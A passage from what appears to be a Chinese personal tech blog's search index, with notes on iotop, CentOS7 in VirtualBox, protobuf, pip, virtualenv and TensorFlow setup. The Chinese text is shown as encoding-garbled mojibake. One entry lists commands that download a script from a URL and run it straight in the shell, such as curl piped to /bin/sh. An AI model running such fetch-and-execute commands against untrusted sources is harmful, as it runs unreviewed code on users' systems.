NUMï¼šæ˜¾ç¤ºNUMæ¬¡ï¼Œä¸»è¦ç”¨äºéäº¤äº’å¼æ¨¡å¼ã€‚</span><br><span class="line">-d SECï¼šé—´éš”SECç§’æ˜¾ç¤ºä¸€æ¬¡ã€‚</span><br><span class="line">-p PIDï¼šç›‘æ§çš„è¿›ç¨‹pidã€‚</span><br><span class="line">-u USERï¼šç›‘æ§çš„è¿›ç¨‹ç”¨æˆ·ã€‚</span><br></pre></td></tr></table></figure><h4 id="iotopå¸¸ç”¨å¿«æ·é”®ï¼š"><a href="#iotopå¸¸ç”¨å¿«æ·é”®ï¼š" class="headerlink" title="iotopå¸¸ç”¨å¿«æ·é”®ï¼š"></a>iotopå¸¸ç”¨å¿«æ·é”®ï¼š</h4><p>å·¦å³ç®­å¤´ï¼šæ”¹å˜æ’åºæ–¹å¼ï¼Œé»˜è®¤æ˜¯æŒ‰IOæ’åºã€‚<br>rï¼šæ”¹å˜æ’åºé¡ºåºã€‚<br>oï¼šåªæ˜¾ç¤ºæœ‰IOè¾“å‡ºçš„è¿›ç¨‹ã€‚<br>pï¼šè¿›ç¨‹&#x2F;çº¿ç¨‹çš„æ˜¾ç¤ºæ–¹å¼çš„åˆ‡æ¢ã€‚<br>aï¼šæ˜¾ç¤ºç´¯ç§¯ä½¿ç”¨é‡ã€‚<br>qï¼šé€€å‡ºã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://man.linuxde.net/iotop">ã€1ã€‘</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> iotop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pigz</title>
      <link href="/post/pigz.html"/>
      <url>/post/pigz.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://my.oschina.net/uppeng/blog/676813">ã€1ã€‘</a><br><a href="http://www.sergeymarkov.com/blog/2013/07/using-gnu-parallel-to-speed-up-and-simplify-data-analyzes/">ã€2ã€‘</a></p><p><a href="http://blog.csdn.net/xzz_hust/article/details/39183837">ã€3ã€‘</a></p><p><a href="https://linux.die.net/man/1/pigz">ã€4ã€‘</a></p><p><a href="http://www.vaikan.com/use-multiple-cpu-cores-with-your-linux-commands/">ã€5ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VirtualBox-CentOS7</title>
      <link href="/post/virtualbox-contos7.html"/>
      <url>/post/virtualbox-contos7.html</url>
      
        <content type="html"><![CDATA[<h3 id="VirtualBoxä¸‹CentOS7å¸¸è§é—®é¢˜"><a href="#VirtualBoxä¸‹CentOS7å¸¸è§é—®é¢˜" class="headerlink" title="VirtualBoxä¸‹CentOS7å¸¸è§é—®é¢˜"></a>VirtualBoxä¸‹CentOS7å¸¸è§é—®é¢˜</h3><h4 id="å¯åŠ¨åæ˜¾ç¤ºCentOS7-Virtualbox-SMBus-base-address-uninitialized-upgrade-BIOS-or-use-force-addr-0xaddr"><a href="#å¯åŠ¨åæ˜¾ç¤ºCentOS7-Virtualbox-SMBus-base-address-uninitialized-upgrade-BIOS-or-use-force-addr-0xaddr" class="headerlink" title="å¯åŠ¨åæ˜¾ç¤ºCentOS7 Virtualbox  SMBus base address uninitialized upgrade BIOS or use force_addr=0xaddr"></a>å¯åŠ¨åæ˜¾ç¤º<code>CentOS7 Virtualbox  SMBus base address uninitialized upgrade BIOS or use force_addr=0xaddr</code></h4><p>1ã€æ£€æŸ¥ä¸€ä¸‹ <code>i2c_piix4</code> æ¨¡å—æ˜¯å¦å­˜åœ¨(ä¸€èˆ¬æ­£å¸¸å®‰è£…éƒ½æ˜¯å·²ç»åŠ è½½çš„ï¼Œç¡®è®¤ä¸€ä¸‹æ¯”è¾ƒå¥½)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# lsmod | grep i2c_piix4</span><br><span class="line">i2c_piix4 11098 0</span><br><span class="line">i2c_core 25799 1 i2c_piix4</span><br></pre></td></tr></table></figure><p>2ã€ç¼–è¾‘é»‘åå•æ–‡ä»¶â€¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# vi /etc/modprobe.d/blacklist.conf</span><br></pre></td></tr></table></figure><p>3ã€å°†ä¸‹é¢çš„è¯­å¥åŠ å…¥é»‘åå•çš„æœ€åä¸€è¡Œï¼Œ<code>:wq</code>ä¿å­˜é€€å‡º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist i2c_piix4</span><br></pre></td></tr></table></figure><p>4ã€rebooté‡å¯ç³»ç»Ÿï¼Œé‚£è¡Œé”™è¯¯å°±ä¸è§äº†â€¦</p><h4 id="å¯åŠ¨åæ— ç½‘ç»œNetwork-is-unreachable"><a href="#å¯åŠ¨åæ— ç½‘ç»œNetwork-is-unreachable" class="headerlink" title="å¯åŠ¨åæ— ç½‘ç»œNetwork is unreachable"></a>å¯åŠ¨åæ— ç½‘ç»œ<code>Network is unreachable</code></h4><p>æ£€æŸ¥ <code>/etc/sysconfig/network-scripts/ifcfg-enp0s3</code>é€‰é¡¹<code>ONBOOT</code>æ˜¯å¦ä¸º<code>yes</code>ã€‚å¦‚æœä¸ä¸º<code>yes</code>ä¿®æ”¹ä¸º<code>yes</code>ç„¶åé‡å¯ã€‚</p><h4 id="æ— ifconfigå‘½ä»¤"><a href="#æ— ifconfigå‘½ä»¤" class="headerlink" title="æ— ifconfigå‘½ä»¤"></a>æ— <code>ifconfig</code>å‘½ä»¤</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y net-tools  </span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.slyar.com/blog/mbus-base-address-uninitialized.html">ã€è§£å†³VirtualBoxä¸‹CentOSå¯åŠ¨æ—¶â€MBus base address uninitializedâ€é”™è¯¯ã€‘</a><br><a href="http://www.centoscn.com/CentosBug/osbug/2014/0916/3750.html">ã€centos7æ²¡æœ‰å®‰è£…ifconfigå‘½ä»¤çš„è§£å†³æ–¹æ³•ã€‘</a><br><a href="https://my.oschina.net/u/1428349/blog/288708">ã€CentOS 7 ä¸‹ ifconfig command not found è§£å†³åŠæ³•ã€‘</a><br><a href="https://my.oschina.net/u/1428349/blog/288708">ã€CentOS 7 Network is unreachableã€‘</a>   </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaScriptæ•°æ®ç±»å‹</title>
      <link href="/post/javascript-datetype.html"/>
      <url>/post/javascript-datetype.html</url>
      
        <content type="html"><![CDATA[<h3 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h3><p>æœ€æ–°çš„ ECMAScript æ ‡å‡†å®šä¹‰äº† 7 ç§æ•°æ®ç±»å‹:</p><ul><li>6 ç§ åŸå§‹ç±»å‹:<ul><li>Boolean</li><li>Null</li><li>Undefined</li><li>Number</li><li>String</li><li>Symbol (ECMAScript 6 æ–°å®šä¹‰)</li></ul></li><li>å’Œ Object</li></ul><p>å¯ä»¥ä½¿ç”¨<code>typeof</code>æ“ä½œç¬¦åˆ¤æ–­å¯¹è±¡ç±»å‹</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Data_structures">ã€1ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>notebook</title>
      <link href="/post/notebook.html"/>
      <url>/post/notebook.html</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.jianshu.com/p/0b7a834b2c1e">ã€1ã€‘</a><br><a href="http://blog.csdn.net/whiterbear/article/details/49356815">ã€2ã€‘</a><br><a href="http://mindonmind.github.io/2013/02/08/ipython-notebook-interactive-computing-new-era/">ã€3ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>protobuf</title>
      <link href="/post/protobuf.html"/>
      <url>/post/protobuf.html</url>
      
        <content type="html"><![CDATA[<h3 id="Protocol-Buffers"><a href="#Protocol-Buffers" class="headerlink" title="Protocol Buffers"></a>Protocol Buffers</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm -i -g protobufjs</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pbjs -t json file1.proto file2.proto &gt; bundle.json</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> protobuf = <span class="built_in">require</span>(<span class="string">&#x27;protobufjs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> root = protobuf.<span class="property">Root</span>.<span class="title function_">fromJSON</span>(<span class="built_in">require</span>(<span class="string">&#x27;bundle.json&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">AwesomeMessage</span> = root.<span class="title function_">lookup</span>(<span class="string">&#x27;awesomepackage.AwesomeMessage&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> message = &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;ç±»å‹1&#x27;</span>,</span><br><span class="line">    <span class="attr">status</span>: <span class="string">&#x27;on&#x27;</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;type&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="title class_">AwesomeMessage</span>.<span class="title function_">encode</span>(message).<span class="title function_">finish</span>();</span><br><span class="line"></span><br><span class="line">message = <span class="title class_">AwesomeMessage</span>.<span class="title function_">decode</span>(buffer);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Execute-bash-script-from-URL</title>
      <link href="/post/Execute-bash-script-from-URL.html"/>
      <url>/post/Execute-bash-script-from-URL.html</url>
      
        <content type="html"><![CDATA[<h3 id="curl-è„šæœ¬å¹¶ç›´æ¥æ‰§è¡Œ"><a href="#curl-è„šæœ¬å¹¶ç›´æ¥æ‰§è¡Œ" class="headerlink" title="curl è„šæœ¬å¹¶ç›´æ¥æ‰§è¡Œ"></a>curl è„šæœ¬å¹¶ç›´æ¥æ‰§è¡Œ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -s http://mywebsite.com/myscript.txt)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source &lt;(curl -s http://mywebsite.com/myscript.txt)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL &quot;http://mywebsite.com/myscript.sh&quot; | /bin/sh</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://stackoverflow.com/questions/5735666/execute-bash-script-from-url">ã€1ã€‘</a> <a href="https://www.v2ex.com/t/218912">ã€2ã€‘</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> curl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>neuralnetworksanddeeplearning</title>
      <link href="/post/neuralnetworksanddeeplearning.html"/>
      <url>/post/neuralnetworksanddeeplearning.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pip</title>
      <link href="/post/pip.html"/>
      <url>/post/pip.html</url>
      
        <content type="html"><![CDATA[<h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -s &quot;https://bootstrap.pypa.io/get-pip.py&quot; | python</span><br><span class="line"></span><br><span class="line"># æˆ–è€…ä¸‹è½½å®Œæ‰§è¡Œ</span><br><span class="line">python get-pip.py</span><br></pre></td></tr></table></figure><h4 id="å®‰è£…é…ç½®"><a href="#å®‰è£…é…ç½®" class="headerlink" title="å®‰è£…é…ç½®"></a>å®‰è£…é…ç½®</h4><p><code>--no-setuptools</code> ä¸å®‰è£…setuptools</p><p><code>--no-wheel</code> ä¸å®‰è£…wheel</p><h3 id="å‡çº§"><a href="#å‡çº§" class="headerlink" title="å‡çº§"></a>å‡çº§</h3><p>Linux or macOS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U pip</span><br></pre></td></tr></table></figure><p>Win</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install -U pip</span><br></pre></td></tr></table></figure><h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æŠŠå½“å‰ç¯å¢ƒä¸­æ‰€æœ‰çš„åŒ…åŠç‰ˆæœ¬å†™è¿›requirements.txt</span><br><span class="line">pip freeze &gt; requirements.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æŠŠrequirements.txté‡Œé¢çš„åŒ…å®‰è£…ä¸€é</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://pip.pypa.io/en/stable/installing/">ã€1ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python-virtualenv</title>
      <link href="/post/python-virtualenv.html"/>
      <url>/post/python-virtualenv.html</url>
      
        <content type="html"><![CDATA[<h3 id="Virtualenv"><a href="#Virtualenv" class="headerlink" title="Virtualenv"></a>Virtualenv</h3><p>Virtualenv é€šè¿‡åˆ›å»ºç‹¬ç«‹Pythonå¼€å‘ç¯å¢ƒçš„å·¥å…·, æ¥è§£å†³ä¾èµ–ã€ç‰ˆæœ¬ä»¥åŠé—´æ¥æƒé™<br>é—®é¢˜ã€‚Virtualenv åˆ›å»ºä¸€ä¸ªæ‹¥æœ‰è‡ªå·±å®‰è£…ç›®å½•çš„ç¯å¢ƒ(æ²™ç®±), è¿™ä¸ªç¯å¢ƒä¸ä¸å…¶ä»–è™šæ‹Ÿç¯å¢ƒå…±äº«åº“, èƒ½å¤Ÿæ–¹ä¾¿çš„ç®¡ç†pythonç‰ˆæœ¬å’Œç®¡ç†pythonåº“ã€‚</p><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[sudo] pip install virtualenv</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[sudo] pip install https://github.com/pypa/virtualenv/tarball/develop</span><br></pre></td></tr></table></figure><blockquote><p>pipå®‰è£…å‚è€ƒ<a href="/2016/11/25/pip/">pip</a></p></blockquote><h3 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h3><h4 id="åˆ›å»ºä¸€ä¸ªPythonè™šæ‹Ÿç¯å¢ƒ"><a href="#åˆ›å»ºä¸€ä¸ªPythonè™šæ‹Ÿç¯å¢ƒ" class="headerlink" title="åˆ›å»ºä¸€ä¸ªPythonè™šæ‹Ÿç¯å¢ƒ"></a>åˆ›å»ºä¸€ä¸ªPythonè™šæ‹Ÿç¯å¢ƒ</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">åˆ›å»ºä¸€ä¸ªåä¸ºdeeplearningçš„ç›®å½•, å¹¶ä¸”å®‰è£…äº†deeplearning/bin/python, åˆ›å»ºäº†lib,include,binç›®å½•,å®‰è£…äº†pip</span></span><br><span class="line"></span><br><span class="line">virtualenv deeplearning</span><br></pre></td></tr></table></figure><h4 id="æ¿€æ´»ç¯å¢ƒ"><a href="#æ¿€æ´»ç¯å¢ƒ" class="headerlink" title="æ¿€æ´»ç¯å¢ƒ"></a>æ¿€æ´»ç¯å¢ƒ</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mac &amp; Linux</span></span><br><span class="line">source bin/activate[.sh|.fish|.csh]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Win</span></span><br><span class="line">æ‰“å¼€ activate.bat</span><br></pre></td></tr></table></figure><h4 id="é€€å‡ºç¯å¢ƒ"><a href="#é€€å‡ºç¯å¢ƒ" class="headerlink" title="é€€å‡ºç¯å¢ƒ"></a>é€€å‡ºç¯å¢ƒ</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure><h3 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h3><h4 id="åˆ›å»ºè™šæ‹Ÿç¯å¢ƒæ—¶æŒ‡å®šPythonç‰ˆæœ¬"><a href="#åˆ›å»ºè™šæ‹Ÿç¯å¢ƒæ—¶æŒ‡å®šPythonç‰ˆæœ¬" class="headerlink" title="åˆ›å»ºè™šæ‹Ÿç¯å¢ƒæ—¶æŒ‡å®šPythonç‰ˆæœ¬"></a>åˆ›å»ºè™šæ‹Ÿç¯å¢ƒæ—¶æŒ‡å®šPythonç‰ˆæœ¬</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virtualenv ENV3.5 --python=python3.5</span><br></pre></td></tr></table></figure><p>å¦å¤–</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">virtualenv [OPTIONS] DEST_DIR</span><br><span class="line"></span><br><span class="line">-p PYTHON_EXE, --python=PYTHON_EXE</span><br><span class="line">æŒ‡å®šæ‰€ç”¨çš„pythonè§£æå™¨çš„ç‰ˆæœ¬ï¼Œæ¯”å¦‚ --python=python2.5 å°±ä½¿ç”¨2.5ç‰ˆæœ¬çš„è§£æå™¨åˆ›å»ºæ–°çš„éš”ç¦»ç¯å¢ƒã€‚</span><br><span class="line">é»˜è®¤ä½¿ç”¨çš„æ˜¯å½“å‰ç³»ç»Ÿå®‰è£…(/usr/bin/python)çš„pythonè§£æå™¨ã€‚   </span><br></pre></td></tr></table></figure><h4 id="ç”Ÿæˆå¯æ‰“åŒ…ç¯å¢ƒ"><a href="#ç”Ÿæˆå¯æ‰“åŒ…ç¯å¢ƒ" class="headerlink" title="ç”Ÿæˆå¯æ‰“åŒ…ç¯å¢ƒ"></a>ç”Ÿæˆå¯æ‰“åŒ…ç¯å¢ƒ</h4><p>æŸäº›ç‰¹æ®Šéœ€æ±‚ä¸‹,å¯èƒ½æ²¡æœ‰ç½‘ç»œ, æˆ‘ä»¬æœŸæœ›ç›´æ¥æ‰“åŒ…ä¸€ä¸ªENV, å¯ä»¥è§£å‹åç›´æ¥ä½¿ç”¨, è¿™æ—¶å€™å¯ä»¥ä½¿ç”¨<code>virtualenv --relocatable</code>æŒ‡ä»¤å°†ENVä¿®æ”¹ä¸ºå¯æ›´æ”¹ä½ç½®çš„ENVã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virtualenv --relocatable ./</span><br></pre></td></tr></table></figure><h4 id="åˆ›å»ºä¸€ä¸ªå¹²å‡€çš„ç¯å¢ƒ"><a href="#åˆ›å»ºä¸€ä¸ªå¹²å‡€çš„ç¯å¢ƒ" class="headerlink" title="åˆ›å»ºä¸€ä¸ªå¹²å‡€çš„ç¯å¢ƒ"></a>åˆ›å»ºä¸€ä¸ªå¹²å‡€çš„ç¯å¢ƒ</h4><p>åŠ ä¸Šäº†å‚æ•°â€“no-site-packagesï¼Œè¿™æ ·ï¼Œå·²ç»å®‰è£…åˆ°ç³»ç»ŸPythonç¯å¢ƒä¸­çš„æ‰€æœ‰ç¬¬ä¸‰æ–¹åŒ…éƒ½ä¸ä¼šå¤åˆ¶è¿‡æ¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virtualenv --no-site-packages ENV</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.jianshu.com/p/08c657bd34f1">ã€1ã€‘</a> <a href="http://pythonguidecn.readthedocs.io/zh/latest/dev/virtualenvs.html">ã€2ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>tensorflow</title>
      <link href="/post/tensorflow.html"/>
      <url>/post/tensorflow.html</url>
      
        <content type="html"><![CDATA[<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><blockquote><p>å»ºè®®é¦–å…ˆåˆ›å»ºä¸€ä¸ªpythonè™šæ‹Ÿç¯å¢ƒã€‚å‚è€ƒï¼š<a href="/2016/11/25/python-virtualenv/">python-virtualenv</a></p></blockquote><h4 id="ä¸åŒçš„å¹³å°åŠæ¶æ„"><a href="#ä¸åŒçš„å¹³å°åŠæ¶æ„" class="headerlink" title="ä¸åŒçš„å¹³å°åŠæ¶æ„"></a>ä¸åŒçš„å¹³å°åŠæ¶æ„</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu/Linux 64-bit, CPU only, Python 2.7</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> TF_BINARY_URL=https://storage.googleapis.com/tensorflow/linux/cpu/tensorflow-0.11.0-cp27-none-linux_x86_64.whl</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu/Linux 64-bit, GPU enabled, Python 2.7</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Requires CUDA toolkit 8.0 and CuDNN v5. For other versions, see <span class="string">&quot;Installing from sources&quot;</span> below.</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> TF_BINARY_URL=https://storage.googleapis.com/tensorflow/linux/gpu/tensorflow-0.11.0-cp27-none-linux_x86_64.whl</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mac OS X, CPU only, Python 2.7:</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> TF_BINARY_URL=https://storage.googleapis.com/tensorflow/mac/cpu/tensorflow-0.11.0-py2-none-any.whl</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mac OS X, GPU enabled, Python 2.7:</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> TF_BINARY_URL=https://storage.googleapis.com/tensorflow/mac/gpu/tensorflow-0.11.0-py2-none-any.whl</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu/Linux 64-bit, CPU only, Python 3.4</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> TF_BINARY_URL=https://storage.googleapis.com/tensorflow/linux/cpu/tensorflow-0.11.0-cp34-cp34m-linux_x86_64.whl</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu/Linux 64-bit, GPU enabled, Python 3.4</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Requires CUDA toolkit 8.0 and CuDNN v5. For other versions, see <span class="string">&quot;Installing from sources&quot;</span> below.</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> TF_BINARY_URL=https://storage.googleapis.com/tensorflow/linux/gpu/tensorflow-0.11.0-cp34-cp34m-linux_x86_64.whl</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu/Linux 64-bit, CPU only, Python 3.5</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> TF_BINARY_URL=https://storage.googleapis.com/tensorflow/linux/cpu/tensorflow-0.11.0-cp35-cp35m-linux_x86_64.whl</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu/Linux 64-bit, GPU enabled, Python 3.5</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Requires CUDA toolkit 8.0 and CuDNN v5. For other versions, see <span class="string">&quot;Installing from sources&quot;</span> below.</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> TF_BINARY_URL=https://storage.googleapis.com/tensorflow/linux/gpu/tensorflow-0.11.0-cp35-cp35m-linux_x86_64.whl</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mac OS X, CPU only, Python 3.4 or 3.5:</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> TF_BINARY_URL=https://storage.googleapis.com/tensorflow/mac/cpu/tensorflow-0.11.0-py3-none-any.whl</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mac OS X, GPU enabled, Python 3.4 or 3.5:</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> TF_BINARY_URL=https://storage.googleapis.com/tensorflow/mac/gpu/tensorflow-0.11.0-py3-none-any.whl</span></span><br></pre></td></tr></table></figure><h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Python 2</span><br><span class="line">$ sudo pip install --upgrade $TF_BINARY_URL</span><br><span class="line"></span><br><span class="line"># Python 3</span><br><span class="line">$ sudo pip3 install --upgrade $TF_BINARY_URL</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://github.com/tensorflow/tensorflow/blob/master/tensorflow/g3doc/get_started/os_setup.md">Download and Setup</a></p><hr><p><a href="https://ask.julyedu.com/question/7403">ã€1ã€‘</a></p><p><a 